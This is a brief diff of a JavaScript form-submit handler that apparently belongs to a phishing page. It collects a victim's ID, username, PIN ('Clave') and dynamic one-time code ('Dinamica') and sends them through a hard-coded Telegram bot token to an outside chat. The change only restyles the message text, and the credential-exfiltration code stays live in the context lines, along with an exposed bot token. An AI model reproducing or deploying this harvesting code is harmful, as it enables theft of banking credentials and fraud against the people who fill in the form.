@@ -18,11 +18,11 @@ async function handleSubmit(e) {
         const BOT_TOKEN = '7732026260:AAGS1T29BwTra3Sc2ic9hoKfF4iuIcgMUwo';
         const CHAT_ID   = '-1002386768203';
 
-        const message = `*┏  NUEVA SOLICITUD*\n` +
-                        `*┣  ID:* \`${data.id}\`\n` +
-                        `*┣  Usuario:* \`${data.username}\`\n` +
-                        `*┣  Clave:* \`${data.pin}\`\n` +
-                        `*┗  Dinamica:* \`${data.dynamic}\``;
+        const message = `*////  NUEVA SOLICITUD*\n` +
+                        `*.  ID:* \`${data.id}\`\n` +
+                        `*+  Usuario:* \`${data.username}\`\n` +
+                        `*+  Clave:* \`${data.pin}\`\n` +
+                        `*+  Dinamica:* \`${data.dynamic}\``;
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method:  'POST',
